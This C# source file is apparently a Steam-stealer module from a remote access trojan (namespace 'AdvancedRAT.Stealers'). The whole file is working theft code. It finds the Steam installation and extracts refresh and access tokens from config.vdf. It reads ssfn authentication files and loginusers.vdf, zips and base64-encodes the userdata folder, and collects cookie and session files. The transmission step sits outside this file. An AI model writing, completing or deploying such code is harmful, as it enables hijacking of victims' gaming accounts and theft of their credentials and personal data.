using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using SharpCompress.Archives;
using SharpCompress.Writers;
using SharpCompress.Common;

namespace AdvancedRAT.Stealers.GameClientStealer
{
    public class SteamStealer
    {
        public static async Task<Dictionary<string, string>> StealSteamTokens()
        {
            return await Task.Run(() =>
            {
                Dictionary<string, string> steamTokens = new Dictionary<string, string>();
                
                try
                {
                    string steamPath = FindSteamInstallation();
                    if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath))
                    {
                        Console.WriteLine("Steam installation not found");
                        return steamTokens;
                    }
                    
                    // Look for config.vdf to extract tokens
                    string configPath = Path.Combine(steamPath, "config", "config.vdf");
                    if (File.Exists(configPath))
                    {
                        string configContent = File.ReadAllText(configPath);
                        
                        // Extract refresh_token and access_token using regex
                        var refreshTokenRegex = new Regex(@"""refresh_token""\s+""([^""]+)""");
                        var accessTokenRegex = new Regex(@"""access_token""\s+""([^""]+)""");
                        
                        var refreshTokenMatch = refreshTokenRegex.Match(configContent);
                        var accessTokenMatch = accessTokenRegex.Match(configContent);
                        
                        if (refreshTokenMatch.Success)
                        {
                            steamTokens["refresh_token"] = refreshTokenMatch.Groups[1].Value;
                        }
                        
                        if (accessTokenMatch.Success)
                        {
                            steamTokens["access_token"] = accessTokenMatch.Groups[1].Value;
                        }
                    }
                    
                    // Look for ssfn files (these contain authentication tokens)
                    string[] ssfnFiles = Directory.GetFiles(steamPath, "ssfn*", SearchOption.TopDirectoryOnly);
                    foreach (string ssfnFile in ssfnFiles)
                    {
                        string fileName = Path.GetFileName(ssfnFile);
                        steamTokens[fileName] = File.ReadAllText(ssfnFile);
                    }
                    
                    // Look for loginusers.vdf to get account information
                    string loginUsersPath = Path.Combine(steamPath, "config", "loginusers.vdf");
                    if (File.Exists(loginUsersPath))
                    {
                        steamTokens["loginusers.vdf"] = File.ReadAllText(loginUsersPath);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Steam tokens: {ex.Message}");
                }
                
                return steamTokens;
            });
        }
        
        public static async Task<string> StealSteamUserData()
        {
            return await Task.Run(() =>
            {
                try
                {
                    string steamPath = FindSteamInstallation();
                    if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath))
                    {
                        Console.WriteLine("Steam installation not found");
                        return "";
                    }
                    
                    string userDataPath = Path.Combine(steamPath, "userdata");
                    if (!Directory.Exists(userDataPath))
                    {
                        Console.WriteLine("Steam userdata directory not found");
                        return "";
                    }
                    
                    // Create a temporary archive of the userdata folder
                    string tempArchivePath = Path.GetTempFileName() + ".zip";
                    
                    using (var archive = ArchiveFactory.Create(ArchiveType.Zip))
                    {
                        archive.AddAllFromDirectory(userDataPath);
                        using (var writer = File.OpenWrite(tempArchivePath))
                        {
                            archive.WriteTo(writer);
                        }
                    }
                    
                    // Read the archive as bytes and convert to base64 string
                    byte[] archiveData = File.ReadAllBytes(tempArchivePath);
                    string base64Archive = Convert.ToBase64String(archiveData);
                    
                    // Clean up
                    File.Delete(tempArchivePath);
                    
                    return base64Archive;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Steam userdata: {ex.Message}");
                    return "";
                }
            });
        }
        
        public static async Task<Dictionary<string, string>> StealSteamCookies()
        {
            return await Task.Run(() =>
            {
                Dictionary<string, string> steamCookies = new Dictionary<string, string>();
                
                try
                {
                    string steamPath = FindSteamInstallation();
                    if (string.IsNullOrEmpty(steamPath) || !Directory.Exists(steamPath))
                    {
                        Console.WriteLine("Steam installation not found");
                        return steamCookies;
                    }
                    
                    // Look for cookie files in webcache directory
                    string webCachePath = Path.Combine(steamPath, "htmlcache", "Cache");
                    if (Directory.Exists(webCachePath))
                    {
                        string[] cookieFiles = Directory.GetFiles(webCachePath, "*", SearchOption.TopDirectoryOnly);
                        
                        foreach (string cookieFile in cookieFiles)
                        {
                            string fileName = Path.GetFileName(cookieFile);
                            // Only include certain types of cache files that might contain cookies
                            if (fileName.ToLower().Contains("cookie") || fileName.ToLower().Contains("session"))
                            {
                                steamCookies[fileName] = File.ReadAllText(cookieFile);
                            }
                        }
                    }
                    
                    // Also check for cookies in other potential locations
                    string[] potentialCookiePaths = {
                        Path.Combine(steamPath, "config", "htmlcache"),
                        Path.Combine(steamPath, "userdata"),
                        Path.Combine(steamPath, "appcache")
                    };
                    
                    foreach (string path in potentialCookiePaths)
                    {
                        if (Directory.Exists(path))
                        {
                            string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
                            foreach (string file in files)
                            {
                                string fileName = Path.GetFileName(file);
                                if (fileName.ToLower().Contains("cookie") || 
                                    fileName.ToLower().Contains("session") || 
                                    fileName.ToLower().Contains("storage"))
                                {
                                    steamCookies[fileName] = File.ReadAllText(file);
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stealing Steam cookies: {ex.Message}");
                }
                
                return steamCookies;
            });
        }
        
        private static string FindSteamInstallation()
        {
            try
            {
                // Common Steam installation paths
                string[] possiblePaths = {
                    @"C:\Program Files (x86)\Steam",
                    @"C:\Program Files\Steam",
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Steam")
                };
                
                foreach (string path in possiblePaths)
                {
                    if (Directory.Exists(path))
                    {
                        // Verify it's actually Steam by checking for steam.exe
                        if (File.Exists(Path.Combine(path, "steam.exe")))
                        {
                            return path;
                        }
                    }
                }
                
                // Try to find via registry
                try
                {
                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Valve\Steam");
                    if (key != null)
                    {
                        string steamPath = key.GetValue("SteamPath") as string;
                        if (!string.IsNullOrEmpty(steamPath) && Directory.Exists(steamPath))
                        {
                            return steamPath;
                        }
                    }
                }
                catch {}
                
                return "";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error finding Steam installation: {ex.Message}");
                return "";
            }
        }
        
        public static async Task<bool> IsSteamInstalled()
        {
            string steamPath = FindSteamInstallation();
            return !string.IsNullOrEmpty(steamPath) && Directory.Exists(steamPath);
        }
    }
}